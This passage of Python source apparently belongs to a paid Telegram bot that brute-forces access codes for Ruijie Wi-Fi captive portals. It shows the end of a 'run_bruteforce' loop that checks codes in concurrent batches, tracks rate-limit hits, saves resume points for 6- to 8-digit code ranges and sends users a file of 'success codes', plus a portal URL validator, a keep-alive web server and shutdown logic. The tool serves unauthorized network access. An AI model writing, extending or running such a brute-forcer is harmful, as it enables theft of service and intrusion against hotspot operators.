            await asyncio.gather(*(_check(c) for c in batch), return_exceptions=True)
            checked += len(batch)

            # Persist progress every ~25s for resume
            if mode in ("6", "7", "8") and last_code and (now - last_save) >= 25.0:
                await db_save_progress(str(chat_id), mode, start_digit, last_code)
                last_save = now

            now = time.monotonic()
            if progress_msg is not None and (now - last_progress) >= PROGRESS_UPDATE_INTERVAL:
                found = len(success_texts.get(chat_id, []))
                elapsed = now - scan_start
                speed = (checked / elapsed * 60) if elapsed > 0 else 0
                remaining = (total - checked) if total else 0
                eta = (remaining / speed * 60) if speed > 0 and remaining > 0 else 0
                text = format_progress(
                    checked, total, speed, found, mode,
                    rate_limit_hits=int(rate_state.get("hits", 0)),
                    eta_sec=eta,
                )
                ok = await safe_edit_text(chat_id, progress_msg.message_id, text)
                if not ok:
                    try:
                        new = await bot.send_message(chat_id, text, parse_mode="HTML")
                        progress_msg = new
                    except Exception as e:
                        log.debug("progress send error: %s", e)
                last_progress = now

        # Final progress save
        if mode in ("6", "7", "8") and last_code:
            await db_save_progress(str(chat_id), mode, start_digit, last_code)

        if progress_msg is not None:
            found = len(success_texts.get(chat_id, []))
            if total is not None:
                finish = (
                    f"✅ <b>Scan Finished</b>\n\n"
                    f"📦 Checked : <b>{checked:,}</b> / {total:,}\n"
                    f"✅ Found   : <b>{found}</b>\n"
                    f"📊 Progress: 100%\n"
                    f"<code>[██████████████████]</code>"
                )
            else:
                finish = (
                    f"✅ <b>Scan Finished / Stopped</b>\n\n"
                    f"📦 Checked : <b>{checked:,}</b>\n"
                    f"✅ Found   : <b>{found}</b>"
                )
            ok = await safe_edit_text(chat_id, progress_msg.message_id, finish)
            if not ok:
                await safe_send(chat_id, finish)

        if not file_sent:
            await _send_success_file(chat_id)
            file_sent = True

    except asyncio.CancelledError:
        log.info("scan cancelled chat_id=%s", chat_id)
        if mode in ("6", "7", "8") and last_code:
            await db_save_progress(str(chat_id), mode, start_digit, last_code)
        if not file_sent:
            await _send_success_file(chat_id)
        raise
    except Exception as e:
        log.exception("run_bruteforce fatal: %s", e)
    finally:
        await pool.stop()
        if not file_sent:
            await _send_success_file(chat_id)
        cleanup_scan_state(chat_id)
        await release_scan_slot()

# ============================================================
# SUCCESS FILE
# ============================================================
async def _send_success_file(chat_id: int) -> None:
    if str(chat_id) not in SUCCESS_FILE_TARGETS:
        return
    texts = success_texts.get(chat_id)
    if not texts:
        return
    fname = f"success_{chat_id}_{int(time.time())}.txt"
    try:
        with open(fname, "w", encoding="utf-8") as f:
            f.write("\n".join(texts))
        with open(fname, "rb") as f:
            await bot.send_document(
                chat_id, f, caption="✅ Scan finished — Success Codes file."
            )
    except Exception as e:
        log.debug("send_success_file error: %s", e)
    finally:
        try:
            if os.path.exists(fname):
                os.remove(fname)
        except Exception:
            pass

# ============================================================
# PORTAL URL VALIDATION
# ============================================================
async def check_session_url_improved(session_url: str, use_proxy: bool = False) -> bool:
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "user-agent": _UA_HTML,
    }
    if session is None:
        return False
    try:
        async with session.get(
            session_url,
            allow_redirects=True,
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=12),
        ) as resp:
            if resp.status >= 400:
                return False
            final_url = str(resp.url)
            body = await resp.text()
            if "sessionId" in final_url or "sessionId" in body:
                return True
            for ind in ("portal-as.ruijienetworks.com", "maccauth", "index.html", "lang=en_US"):
                if ind in final_url or ind in body:
                    return True
            patterns = [
                r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)',
                r'[?&]sessionId=([a-zA-Z0-9]+)',
            ]
            for p in patterns:
                if re.search(p, body, re.I) or re.search(p, final_url, re.I):
                    return True
            if "portal" in body.lower() or "captcha" in body.lower():
                return True
            return False
    except asyncio.TimeoutError:
        return False
    except Exception as e:
        log.debug("portal check error: %s", e)
        return False

# ============================================================
# WEB SERVER
# ============================================================
async def _web_root(_request):
    return web.Response(text="Bot is awake and running 24/7! (v4.0 Ultimate)")

async def _web_health(_request):
    return web.json_response(
        {
            "status": "ok",
            "version": "4.0",
            "uptime": int(time.monotonic() - _start_time),
            "active_scans": active_scans_count,
            "total_checked": _global_stats["total_checked"],
            "total_hits": _global_stats["total_hits"],
        }
    )

async def web_server():
    app = web.Application()
    app.router.add_get("/", _web_root)
    app.router.add_get("/health", _web_health)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", WEB_PORT)
    await site.start()
    log.info("Web server listening on port %d", WEB_PORT)

# ============================================================
# POLLING
# ============================================================
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=30, request_timeout=90)
            return
        except asyncio.CancelledError:
            raise
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            log.warning("Polling network error: %s. Reconnect in %ds", e, backoff)
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            log.exception("Polling error: %s. Reconnect in %ds", e, backoff)
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

# ============================================================
# LIFECYCLE
# ============================================================
async def _on_shutdown():
    log.info("Shutting down…")
    for _chat_id, d in list(scan_tasks.items()):
        try:
            d["stop"] = True
            d["task"].cancel()
        except Exception:
            pass
    if session and not session.closed:
        try:
            await session.close()
        except Exception:
            pass
    if _connector and not _connector.closed:
        try:
            await _connector.close()
        except Exception:
            pass
    if _db_conn is not None:
        try:
            _db_conn.commit()
            _db_conn.close()
        except Exception:
            pass
    log.info("Shutdown complete.")

async def main():
    setup_logging()
    log.info("Starting STAR LINK bot Ultimate Edition v4.0 …")

    _get_conn()
    await load_paid_users()

    try:
        me = await bot.get_me()
        log.info("Bot authorized as @%s (id=%s)", me.username, me.id)
    except Exception as e:
        log.error("Bot token invalid or network unreachable: %s", e)

    global session, _connector
    timeout = aiohttp.ClientTimeout(total=22)
    _connector = aiohttp.TCPConnector(
        limit=700,
        limit_per_host=280,
        ttl_dns_cache=300,
        enable_cleanup_closed=True,
        force_close=False,
        ssl=False,
    )
    session = aiohttp.ClientSession(
        timeout=timeout, connector=_connector, connector_owner=False
    )

    asyncio.create_task(web_server())

    stop_event = asyncio.Event()

    def _signal_handler():
        stop_event.set()

    try:
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sig, _signal_handler)
            except (NotImplementedError, RuntimeError):
                pass
    except Exception:
        pass

    polling_task = asyncio.create_task(start_polling())
    try:
        await stop_event.wait()
    except asyncio.CancelledError:
        pass
    finally:
        polling_task.cancel()
        try:
            await polling_task
        except (asyncio.CancelledError, Exception):
            pass
        await _on_shutdown()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
